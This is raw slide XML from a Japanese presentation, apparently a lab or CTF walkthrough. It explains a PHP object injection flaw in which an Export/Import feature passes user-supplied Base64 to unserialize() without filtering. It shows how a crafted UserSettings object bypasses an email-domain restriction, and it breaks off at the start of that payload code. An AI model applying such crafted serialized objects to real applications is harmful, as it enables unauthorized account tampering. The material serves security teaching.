        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>現在のユーザー状態</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 1" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="1817985"/>
            <a:ext cx="304800" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 2" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3403600" y="1504950"/>
            <a:ext cx="1016000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3594308" y="2038350"/>
            <a:ext cx="634484" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>serialize()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 3" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4546600" y="1817985"/>
            <a:ext cx="304800" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Image 4" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4978400" y="1504950"/>
            <a:ext cx="1143000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4867682" y="2038350"/>
            <a:ext cx="1364337" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Base64表示（画面）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6248400" y="1771650"/>
            <a:ext cx="2942034" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>→ サーバー外への一方向フロー（それ自体は無害）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2722761"/>
            <a:ext cx="939800" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IMPORT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 5" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="2385020"/>
            <a:ext cx="1016000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1959273" y="2918420"/>
            <a:ext cx="754955" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃者が用意</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>したBase64</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Image 6" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="2782491"/>
            <a:ext cx="304800" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Image 7" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3403600" y="2469455"/>
            <a:ext cx="1016000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3344029" y="3002855"/>
            <a:ext cx="1135142" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>base64_decode()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Image 8" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4546600" y="2782491"/>
            <a:ext cx="304800" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Image 9" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId10"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4978400" y="2385020"/>
            <a:ext cx="1143000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5177532" y="2918420"/>
            <a:ext cx="744736" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unserialize()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>— フィルタ無し</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="Image 10" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId11"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6248400" y="2782491"/>
            <a:ext cx="304800" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="Image 11" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId12"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6680200" y="2469455"/>
            <a:ext cx="1143000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6798191" y="3002855"/>
            <a:ext cx="907018" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="14171A"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$user-&gt;save()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="3513336"/>
            <a:ext cx="10560050" cy="464741"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15713"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E08A3C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Image 12" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId13"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="3656806"/>
            <a:ext cx="177800" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1276350" y="3643511"/>
            <a:ext cx="10096500" cy="229791"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1610"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Export/Import機能は「アプリが自分で作ったシリアライズデータを、自分でまた読み込む」設計が多く、検証ロジックが省略されがちな典型的な攻撃面</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Object Injectionの悪用：2つの成果</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1482725"/>
            <a:ext cx="5187950" cy="4356100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2259"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="1689100"/>
            <a:ext cx="4918456" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="50" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>結果1：ドメイン制限の回避</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="1977330"/>
            <a:ext cx="4918456" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃者が自作したUserSettingsオブジェクトをImportするだけで、禁止されているはずの @htbank.com メールへ更新できる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="2517080"/>
            <a:ext cx="4775200" cy="1088727"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5832"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="83001" tIns="83001" rIns="0" bIns="57601" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>new UserSettings(</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1395"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  'pentest',</a:t>
            </a:r>
